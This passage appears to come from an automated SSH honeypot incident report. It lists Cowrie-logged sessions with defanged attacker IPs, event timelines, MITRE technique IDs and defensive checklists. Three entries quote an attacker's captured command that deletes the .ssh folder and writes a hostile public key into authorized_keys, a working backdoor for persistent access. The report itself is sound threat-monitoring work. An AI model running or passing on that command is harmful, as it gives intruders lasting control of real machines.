- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1700fbdc8bba

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-29 17:04 |
| **Last Seen** | 2026-07-29 17:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:04:39` | `cowrie.session.connect` |
| `2026-07-29 17:04:39` | `cowrie.client.version` |
| `2026-07-29 17:04:40` | `cowrie.client.kex` |
| `2026-07-29 17:04:40` | `cowrie.login.success` |
| `2026-07-29 17:04:40` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:04:40` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c368cbdc543

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:14 |
| **Last Seen** | 2026-07-29 17:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:14:48` | `cowrie.session.connect` |
| `2026-07-29 17:14:48` | `cowrie.client.version` |
| `2026-07-29 17:14:49` | `cowrie.client.kex` |
| `2026-07-29 17:14:50` | `cowrie.login.success` |
| `2026-07-29 17:14:50` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:14:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:14:51` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03fe02d532ad

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-07-29 17:16 |
| **Last Seen** | 2026-07-29 17:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:16:10` | `cowrie.session.connect` |
| `2026-07-29 17:16:10` | `cowrie.client.version` |
| `2026-07-29 17:16:10` | `cowrie.client.kex` |
| `2026-07-29 17:16:11` | `cowrie.login.success` |
| `2026-07-29 17:16:12` | `cowrie.session.params` |
| `2026-07-29 17:16:12` | `cowrie.command.input` |
| `2026-07-29 17:16:12` | `cowrie.command.failed` |
| `2026-07-29 17:16:12` | `cowrie.log.closed` |
| `2026-07-29 17:16:13` | `cowrie.session.params` |
| `2026-07-29 17:16:13` | `cowrie.command.input` |
| `2026-07-29 17:16:13` | `cowrie.session.file_download` |
| `2026-07-29 17:16:13` | `cowrie.log.closed` |
| `2026-07-29 17:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f97feffed1

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-07-29 17:16 |
| **Last Seen** | 2026-07-29 17:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:16:13` | `cowrie.session.connect` |
| `2026-07-29 17:16:13` | `cowrie.client.version` |
| `2026-07-29 17:16:13` | `cowrie.client.kex` |
| `2026-07-29 17:16:14` | `cowrie.login.success` |
| `2026-07-29 17:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19931d801337

| Field | Detail |
|---|---|
| **Source IP** | `187.174.238[.]116` |
| **First Seen** | 2026-07-29 17:16 |
| **Last Seen** | 2026-07-29 17:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:16:14` | `cowrie.session.connect` |
| `2026-07-29 17:16:14` | `cowrie.client.version` |
| `2026-07-29 17:16:14` | `cowrie.client.kex` |
| `2026-07-29 17:16:14` | `cowrie.login.success` |
| `2026-07-29 17:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.174.238[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.174.238[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13892cbd0def

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:17 |
| **Last Seen** | 2026-07-29 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:17:18` | `cowrie.session.connect` |
| `2026-07-29 17:17:18` | `cowrie.client.version` |
| `2026-07-29 17:17:18` | `cowrie.client.kex` |
| `2026-07-29 17:17:19` | `cowrie.login.success` |
| `2026-07-29 17:17:20` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:17:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:17:20` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16205bf230cf

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-29 17:17 |
| **Last Seen** | 2026-07-29 17:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:17:20` | `cowrie.session.connect` |
| `2026-07-29 17:17:20` | `cowrie.client.version` |
| `2026-07-29 17:17:20` | `cowrie.client.kex` |
| `2026-07-29 17:17:21` | `cowrie.login.success` |
| `2026-07-29 17:17:22` | `cowrie.session.params` |
| `2026-07-29 17:17:22` | `cowrie.command.input` |
| `2026-07-29 17:17:22` | `cowrie.command.failed` |
| `2026-07-29 17:17:22` | `cowrie.log.closed` |
| `2026-07-29 17:17:23` | `cowrie.session.params` |
| `2026-07-29 17:17:23` | `cowrie.command.input` |
| `2026-07-29 17:17:23` | `cowrie.session.file_download` |
| `2026-07-29 17:17:23` | `cowrie.log.closed` |
| `2026-07-29 17:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94f5beab517

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-29 17:17 |
| **Last Seen** | 2026-07-29 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:17:23` | `cowrie.session.connect` |
| `2026-07-29 17:17:23` | `cowrie.client.version` |
| `2026-07-29 17:17:23` | `cowrie.client.kex` |
| `2026-07-29 17:17:24` | `cowrie.login.success` |
| `2026-07-29 17:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d21c7b55e9

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-29 17:17 |
| **Last Seen** | 2026-07-29 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:17:25` | `cowrie.session.connect` |
| `2026-07-29 17:17:25` | `cowrie.client.version` |
| `2026-07-29 17:17:26` | `cowrie.client.kex` |
| `2026-07-29 17:17:26` | `cowrie.login.success` |
| `2026-07-29 17:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b29956c957b9

| Field | Detail |
|---|---|
| **Source IP** | `136.185.6[.]181` |
| **First Seen** | 2026-07-29 17:18 |
| **Last Seen** | 2026-07-29 17:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:18:34` | `cowrie.session.connect` |
| `2026-07-29 17:18:34` | `cowrie.client.version` |
| `2026-07-29 17:18:34` | `cowrie.client.kex` |
| `2026-07-29 17:18:36` | `cowrie.login.success` |
| `2026-07-29 17:18:37` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.185.6[.]181` to AbuseIPDB if not already reported
- [ ] Block `136.185.6[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5856880cc53e

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:19 |
| **Last Seen** | 2026-07-29 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:19:47` | `cowrie.session.connect` |
| `2026-07-29 17:19:47` | `cowrie.client.version` |
| `2026-07-29 17:19:47` | `cowrie.client.kex` |
| `2026-07-29 17:19:48` | `cowrie.login.success` |
| `2026-07-29 17:19:49` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:19:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:19:49` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-631912ad43fa

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:20 |
| **Last Seen** | 2026-07-29 17:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:20:30` | `cowrie.session.connect` |
| `2026-07-29 17:20:30` | `cowrie.client.version` |
| `2026-07-29 17:20:30` | `cowrie.client.kex` |
| `2026-07-29 17:20:32` | `cowrie.login.success` |
| `2026-07-29 17:20:32` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:20:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:20:34` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2729d7af1f56

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-29 17:21 |
| **Last Seen** | 2026-07-29 17:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:21:38` | `cowrie.session.connect` |
| `2026-07-29 17:21:39` | `cowrie.client.version` |
| `2026-07-29 17:21:39` | `cowrie.client.kex` |
| `2026-07-29 17:21:41` | `cowrie.login.success` |
| `2026-07-29 17:21:41` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20875c995d63

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-07-29 17:21 |
| **Last Seen** | 2026-07-29 17:22 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:21:53` | `cowrie.session.connect` |
| `2026-07-29 17:21:54` | `cowrie.client.version` |
| `2026-07-29 17:21:54` | `cowrie.client.kex` |
| `2026-07-29 17:21:59` | `cowrie.login.success` |
| `2026-07-29 17:22:00` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9388c422996

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:22 |
| **Last Seen** | 2026-07-29 17:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:22:54` | `cowrie.session.connect` |
| `2026-07-29 17:22:54` | `cowrie.client.version` |
| `2026-07-29 17:22:55` | `cowrie.client.kex` |
| `2026-07-29 17:22:56` | `cowrie.login.success` |
| `2026-07-29 17:22:56` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:22:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:22:56` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f8ebd05dee

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-07-29 17:23 |
| **Last Seen** | 2026-07-29 17:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:23:03` | `cowrie.session.connect` |
| `2026-07-29 17:23:04` | `cowrie.client.version` |
| `2026-07-29 17:23:04` | `cowrie.client.kex` |
| `2026-07-29 17:23:07` | `cowrie.login.success` |
| `2026-07-29 17:23:07` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b298e531890a

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-07-29 17:25 |
| **Last Seen** | 2026-07-29 17:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:25:18` | `cowrie.session.connect` |
| `2026-07-29 17:25:20` | `cowrie.client.version` |
| `2026-07-29 17:25:20` | `cowrie.client.kex` |
| `2026-07-29 17:25:22` | `cowrie.login.success` |
| `2026-07-29 17:25:23` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-825d5cd6a868

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 17:25 |
| **Last Seen** | 2026-07-29 17:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:25:56` | `cowrie.session.connect` |
| `2026-07-29 17:25:56` | `cowrie.client.version` |
| `2026-07-29 17:25:56` | `cowrie.client.kex` |
| `2026-07-29 17:25:57` | `cowrie.login.success` |
| `2026-07-29 17:25:57` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:25:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:25:58` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5434e6907e22

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:26 |
| **Last Seen** | 2026-07-29 17:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:26:23` | `cowrie.session.connect` |
| `2026-07-29 17:26:23` | `cowrie.client.version` |
| `2026-07-29 17:26:23` | `cowrie.client.kex` |
| `2026-07-29 17:26:25` | `cowrie.login.success` |
| `2026-07-29 17:26:26` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:26:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:26:27` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca917f28a80

| Field | Detail |
|---|---|
| **Source IP** | `45.78.235[.]121` |
| **First Seen** | 2026-07-29 17:27 |
| **Last Seen** | 2026-07-29 17:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:27:25` | `cowrie.session.connect` |
| `2026-07-29 17:27:25` | `cowrie.client.version` |
| `2026-07-29 17:27:25` | `cowrie.client.kex` |
| `2026-07-29 17:27:26` | `cowrie.login.success` |
| `2026-07-29 17:27:27` | `cowrie.session.params` |
| `2026-07-29 17:27:27` | `cowrie.command.input` |
| `2026-07-29 17:27:27` | `cowrie.command.failed` |
| `2026-07-29 17:27:28` | `cowrie.log.closed` |
| `2026-07-29 17:27:29` | `cowrie.session.params` |
| `2026-07-29 17:27:29` | `cowrie.command.input` |
| `2026-07-29 17:27:29` | `cowrie.session.file_download` |
| `2026-07-29 17:27:29` | `cowrie.log.closed` |
| `2026-07-29 17:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.235[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.78.235[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ed7a05fe01c

| Field | Detail |
|---|---|
| **Source IP** | `45.78.235[.]121` |
| **First Seen** | 2026-07-29 17:27 |
| **Last Seen** | 2026-07-29 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:27:29` | `cowrie.session.connect` |
| `2026-07-29 17:27:29` | `cowrie.client.version` |
| `2026-07-29 17:27:29` | `cowrie.client.kex` |
| `2026-07-29 17:27:30` | `cowrie.login.success` |
| `2026-07-29 17:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.235[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.78.235[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d37ef7beaaba

| Field | Detail |
|---|---|
| **Source IP** | `45.78.235[.]121` |
| **First Seen** | 2026-07-29 17:27 |
| **Last Seen** | 2026-07-29 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:27:31` | `cowrie.session.connect` |
| `2026-07-29 17:27:31` | `cowrie.client.version` |
| `2026-07-29 17:27:31` | `cowrie.client.kex` |
| `2026-07-29 17:27:32` | `cowrie.login.success` |
| `2026-07-29 17:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.235[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.78.235[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e819059eee

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:31 |
| **Last Seen** | 2026-07-29 17:36 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
